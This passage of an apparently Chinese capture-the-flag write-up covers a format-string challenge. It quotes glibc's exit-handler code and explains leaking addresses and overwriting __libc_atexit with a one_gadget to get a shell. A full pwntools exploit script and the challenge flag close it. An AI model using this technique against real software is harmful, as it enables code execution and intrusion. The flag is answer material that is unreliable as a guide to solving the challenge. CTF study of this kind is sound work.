                case ef_us:
                  break;
                case ef_on:
                  onfct = f->func.on.fn;
    #ifdef PTR_DEMANGLE
                  PTR_DEMANGLE (onfct);
    #endif
                  onfct (status, f->func.on.arg);
                  break;
                case ef_at:
                  atfct = f->func.at;
    #ifdef PTR_DEMANGLE
                  PTR_DEMANGLE (atfct);
    #endif
                  atfct ();
                  break;
                case ef_cxa:
                  /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),
                     we must mark this function as ef_free.  */
                  f->flavor = ef_free;
                  cxafct = f->func.cxa.fn;
    #ifdef PTR_DEMANGLE
                  PTR_DEMANGLE (cxafct);
    #endif
                  cxafct (f->func.cxa.arg, status);
                  break;
                }
              /* Re-lock again before looking at global state.  */
              __libc_lock_lock (__exit_funcs_lock);
              if (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))
                /* The last exit function, or another thread, has registered
                   more exit functions.  Start the loop over.  */
                goto restart;
            }
          *listp = cur->next;
          if (*listp != NULL)
            /* Don't free the last element in the chain, this is the statically
               allocate element.  */
            free (cur);
          __libc_lock_unlock (__exit_funcs_lock);
        }
      if (run_list_atexit)
        RUN_HOOK (__libc_atexit, ());
      _exit (status);
    }
    void
    exit (int status)
    {
      __run_exit_handlers (status, &__exit_funcs, true, true);
    }
    libc_hidden_def (exit)
注意到`__libc_atexit`这个函数指针，当程序退出会调用exit函数，最终调用`__libc_atexit`所指向的地址
    # RUN_HOOK (__libc_atexit, ());
    ...
    # define DEFINE_HOOK_RUNNER(name, runner, proto, args) 
    DEFINE_HOOK (name, proto); 
    extern void runner proto; void runner proto { RUN_HOOK (name, args); }
    ...
现在问题就在于如何将`one_gadget`写入该地址。向buf随便输入一串字符（我这里输入`one_gadget`的值），在内存检索该值，一共找到两处：
继续组织这样一串字符输入到buf
    pl = "%{}x{}".format(4096, p64(one_gadget))
    s.ru("comment?")
    s.sl(pl)
明显看到`one_gadget`往上了0x1000的偏移量进行写入，由于libc位于stack的上方，通过计算合适的偏移量便可用`one_gadget`覆盖`__libc_atexit`
当调用完`__libc_start_main`程序准备退出之时，我们跟进到libc的`exit`函数调用`__libc_atexit`的地方
可以在IDA里看到该处的代码
此时rbx的值，目标就是将0x7f7adebb46c8地址的值覆盖成one_gadget
来算算到达该地址所需要的偏移，这里的`0xa80e835298`便是偏移量
`0x1e66c8`是`__libc_atexit`相对于libc基址的偏移，可以在IDA找到该结构
`0x390`是栈内地址偏移
与我们计算出来的偏移相符合
覆盖`__libc_atexit`为`one_gadget`地址
## 0x03 get shell~
完整的EXP
    #! /usr/bin/env python
    # -*- coding: utf-8 -*-    
    from pwn import *
    import os, sys
    # Setting at first
    DEBUG = 3
    LIBCV = 2.19
    context.arch = "amd64"
    #context.log_level = "debug"
    elf = ELF("./printf",checksec=False)
    # synonyms for faster typing
    tube.s = tube.send
    tube.sl = tube.sendline
    tube.sa = tube.sendafter
    tube.sla = tube.sendlineafter
    tube.r = tube.recv
    tube.ru = tube.recvuntil
    tube.rl = tube.recvline
    tube.ra = tube.recvall
    tube.rr = tube.recvregex
    tube.irt = tube.interactive
    if DEBUG == 1:
        if context.arch == "i386":
            libc = ELF("/lib/i386-linux-gnu/libc.so.6",checksec=False)
        elif context.arch == "amd64":
            libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
        s = process("./printf")
    elif DEBUG == 2:
        if context.arch == "i386":
            libc = ELF("/root/toolchain/elf/glibc/glibc-"+str(LIBCV)+"/x86/libc.so.6",checksec=False)
            os.system("patchelf --set-interpreter /root/toolchain/elf/glibc/x86/glibc-"+str(LIBCV)+"/x86/ld-linux-x86-64.so.2 printf")
            os.system("patchelf --set-rpath /root/toolchain/elf/glibc/glibc-"+str(LIBCV)+"/x86:/libc.so.6 printf")
        elif context.arch == "amd64":
            #libc = ELF("/root/toolchain/elf/glibc/glibc-"+str(LIBCV)+"/x64/libc.so.6",checksec=False)
            #os.system("patchelf --set-interpreter /root/toolchain/elf/glibc/glibc-"+str(LIBCV)+"/x64/ld-linux-x86-64.so.2 printf")
            #os.system("patchelf --set-rpath /root/toolchain/elf/glibc/glibc-"+str(LIBCV)+"/x64:/libc.so.6 printf")
            libc = ELF("./libc.so.6")
            #os.system("patchelf --set-interpreter /root/workspace/elf/ld-linux-x86-64-b6d3f5f70ba36f736a596a01829be4d619e373b4167b513d634c044ac7d74b94.so.2 printf")
            #os.system("patchelf --set-rpath /root/workspace/elf:/libc.so.6 printf")
        s = process("./printf")
    elif DEBUG == 3:
        libc = ELF("./libc.so.6",checksec=False)
        ip = "printf.chal.ctf.westerns.tokyo" 
        port = 10001
        s = remote(ip,port)
    def clean():
        s.close()
        if DEBUG == 2:
            if context.arch == "i386":
                os.system("patchelf --set-interpreter /lib/ld-linux.so.2 printf")
                os.system("patchelf --set-rpath /lib/i386-linux-gnu:/libc.so.6 printf")
            if context.arch == "amd64":
                os.system("patchelf --set-interpreter /lib64/ld-linux-x86-64.so.2 printf")
                os.system("patchelf --set-rpath /lib/x86_64-linux-gnu:/libc.so.6 printf")
    def pwn():
        #zx(0x130B)
        #pause()
        pl = "%lx "*((0x100-4)/4)#64
        s.sla("What's your name?", pl)
        s.ru("Hi, n")
        leak = s.ru("Do").split(" ")
        libc.address = int(leak[2],16) - 0x10d024
        stack = int(leak[39],16)
        canary = int(leak[40],16)
        proc_base = int(leak[41],16) - 0x2a40
        one_gadget = libc.address + 0xe2383
        info("libc.address 0x%x", libc.address)
        info("stack 0x%x", stack)
        info("canary 0x%x", canary)
        info("proc_base 0x%x", proc_base)
        info("one_gadget 0x%x", one_gadget)
        atexit_stack_diff = stack - (libc.address + 0x1e66c8) - 0x390 + 8
        info("atexit_stack_diff 0x%x", atexit_stack_diff)
        pl = "%{}x{}".format(atexit_stack_diff, p64(one_gadget))
        s.ru("comment?")
        s.sl(pl)
        s.irt()
        #clean()
        # TWCTF{Pudding_Pudding_Pudding_purintoehu}
    if __name__ == "__main__":
        pwn()
WIN~